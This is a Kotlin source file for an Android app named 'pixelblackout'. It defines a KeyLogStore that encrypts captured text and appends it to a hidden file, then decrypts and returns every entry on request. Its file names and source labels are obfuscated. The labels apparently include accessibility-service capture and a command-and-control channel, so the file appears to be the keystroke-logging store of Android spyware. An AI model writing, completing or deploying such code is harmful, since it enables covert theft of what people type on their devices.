package com.example.pixelblackout.managers

import android.content.Context
import android.util.Log
import com.example.pixelblackout.BuildConfig
import com.example.pixelblackout.utils.StringVault
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.time.Instant
import java.time.format.DateTimeFormatter

object KeyLogStore {
    private val DIRECTORY = StringVault.reveal("QEJAS0YT")
    private val FILENAME = StringVault.reveal("UFpNQA1HQlc=")
    val SOURCE_CONSOLE: String = StringVault.reveal("QExNUExPRg==")
    val SOURCE_C2: String = StringVault.reveal("QBE=")
    val SOURCE_SERVICE: String = StringVault.reveal("UEZRVUpARg==")
    val SOURCE_ACCESSIBILITY: String = StringVault.reveal("QkBARlBQSkFKT0pXWg==")

    fun append(context: Context, source: String, text: String) {
        if (text.isBlank()) return
        val payload = JSONObject().apply {
            put("when", DateTimeFormatter.ISO_INSTANT.format(Instant.now()))
            put("source", source)
            put("body", text)
        }
        val encrypted = runCatching { SecretCipher.encrypt(payload.toString()) }.getOrNull() ?: return
        try {
            val folder = File(context.filesDir, DIRECTORY)
            if (!folder.exists()) {
                folder.mkdirs()
            }
            FileOutputStream(File(folder, FILENAME), true).bufferedWriter().use { writer ->
                writer.append(encrypted)
                writer.newLine()
            }
        } catch (io: IOException) {
            if (BuildConfig.DEBUG) {
                Log.w("KeyLogStore", "Failed to persist entry", io)
            }
        }
    }

    fun readAll(context: Context): String {
        val folder = File(context.filesDir, DIRECTORY)
        val file = File(folder, FILENAME)
        if (!file.exists()) return StringVault.reveal("eA==") + StringVault.reveal("fg==")
        val entries = mutableListOf<JSONObject>()
        file.forEachLine { line ->
            val decrypted = runCatching { SecretCipher.decrypt(line) }.getOrNull()
            if (decrypted != null) {
                runCatching { JSONObject(decrypted) }.getOrNull()?.let { entries.add(it) }
            }
        }
        val prefix = StringVault.reveal("eA==")
        val suffix = StringVault.reveal("fg==")
        return entries.joinToString(prefix = prefix, postfix = suffix) { it.toString() }
    }
}
